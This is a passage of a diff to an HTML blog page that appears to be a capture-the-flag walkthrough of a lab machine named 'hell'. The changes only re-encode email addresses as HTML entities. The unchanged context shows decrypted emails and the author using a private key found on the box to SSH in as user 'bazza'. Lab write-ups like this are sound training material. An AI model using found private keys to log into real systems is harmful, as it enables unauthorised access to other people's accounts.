+      &ldquo;<a href="&#x6d;&#97;&#x69;&#108;&#x74;&#111;&#x3a;&#106;&#x61;&#x63;&#x6b;&#x40;&#99;&#111;&#119;&#108;&#111;&#118;&#x65;&#x72;&#x73;&#x2e;&#99;&#x6f;&#109;">&#106;&#97;&#x63;&#107;&#64;&#99;&#111;&#119;&#x6c;&#111;&#x76;&#x65;&#x72;&#x73;&#46;&#99;&#111;&#109;</a>&rdquo;
 gpg: WARNING: message was not integrity protected
 $ cat email.txt
 Ok Jack. I&rsquo;ve created the account &lsquo;milk_4_life&rsquo; as per your request. Please stop emailing me about this now or I&rsquo;m going to talk to HR like we discussed.</p>
@@ -6731,8 +6860,8 @@ No password or keyfile specified.[/plain]</p>
 <p>Looking around a bit more, it looks like George has also signed up for RockYou</p>
 
 <p>[plain gutter=&ldquo;false&rdquo;]
-From: <a href="&#x6d;&#97;&#x69;&#108;&#116;&#x6f;&#x3a;&#x61;&#x64;&#109;&#x69;&#x6e;&#64;&#x72;&#x6f;&#x63;&#107;&#x79;&#x6f;&#x75;&#x2e;&#x63;&#111;&#109;">&#97;&#100;&#109;&#x69;&#x6e;&#64;&#114;&#111;&#99;&#107;&#121;&#111;&#x75;&#x2e;&#x63;&#x6f;&#109;</a>
-To: <a href="&#x6d;&#97;&#105;&#108;&#x74;&#x6f;&#58;&#115;&#117;&#x70;&#101;&#114;&#95;&#97;&#100;&#109;&#x69;&#x6e;&#x40;&#x68;&#101;&#108;&#x6c;&#46;&#99;&#x6f;&#x6d;">&#115;&#x75;&#112;&#101;&#114;&#95;&#97;&#100;&#x6d;&#x69;&#110;&#64;&#x68;&#x65;&#108;&#x6c;&#x2e;&#99;&#111;&#x6d;</a>
+From: <a href="&#x6d;&#x61;&#105;&#x6c;&#x74;&#111;&#x3a;&#97;&#100;&#109;&#x69;&#x6e;&#64;&#x72;&#x6f;&#x63;&#107;&#x79;&#x6f;&#117;&#x2e;&#99;&#111;&#109;">&#x61;&#100;&#109;&#x69;&#110;&#64;&#x72;&#x6f;&#x63;&#107;&#x79;&#111;&#117;&#46;&#x63;&#111;&#109;</a>
+To: <a href="&#109;&#97;&#105;&#x6c;&#x74;&#x6f;&#x3a;&#x73;&#117;&#x70;&#101;&#114;&#95;&#x61;&#x64;&#109;&#x69;&#110;&#64;&#x68;&#101;&#108;&#x6c;&#46;&#x63;&#x6f;&#109;">&#x73;&#117;&#x70;&#x65;&#114;&#x5f;&#x61;&#100;&#109;&#105;&#x6e;&#x40;&#104;&#x65;&#108;&#108;&#x2e;&#x63;&#x6f;&#x6d;</a>
 Subject: Account Activation
 Date: 13th November 2009</p>
 
@@ -6779,7 +6908,7 @@ george@hell:~/tc$ [/plain]</p>
 <p>Hmm, a private key - lets try SSHing in as bazza using this key and see what happens.</p>
 
 <p>[plain gutter=&ldquo;false&rdquo;]
-george@hell:~/tc$ ssh <a href="&#x6d;&#x61;&#x69;&#108;&#x74;&#x6f;&#x3a;&#x62;&#x61;&#x7a;&#x7a;&#x61;&#64;&#x31;&#x32;&#55;&#46;&#x30;&#46;&#x30;&#46;&#49;">&#x62;&#97;&#x7a;&#x7a;&#x61;&#x40;&#49;&#x32;&#55;&#x2e;&#x30;&#x2e;&#48;&#46;&#49;</a> -i ./id_rsa
+george@hell:~/tc$ ssh <a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#58;&#x62;&#97;&#122;&#122;&#x61;&#64;&#x31;&#50;&#x37;&#46;&#x30;&#x2e;&#48;&#x2e;&#49;">&#98;&#x61;&#x7a;&#122;&#x61;&#64;&#x31;&#50;&#x37;&#x2e;&#48;&#x2e;&#48;&#x2e;&#49;</a> -i ./id_rsa
 Linux hell 3.2.0-4-486 #1 Debian 3.2.57-3+deb7u2 i686</p>
 
 <p>The programs included with the Debian GNU/Linux system are free software;
